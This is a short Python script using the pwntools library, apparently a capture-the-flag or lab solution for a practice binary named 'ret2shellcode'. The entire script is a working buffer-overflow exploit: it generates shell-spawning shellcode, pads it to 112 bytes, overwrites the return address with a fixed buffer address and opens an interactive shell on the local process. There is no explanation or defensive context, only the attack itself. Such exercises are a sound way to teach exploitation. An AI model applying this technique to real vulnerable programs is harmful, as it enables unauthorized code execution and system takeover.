from pwn import *

sh = process('./ret2shellcode')

payload = asm(shellcraft.sh())

addr = p32(0x804a080)

payload = payload.ljust(112,'a') + addr

sh.send(payload)

sh.interactive()
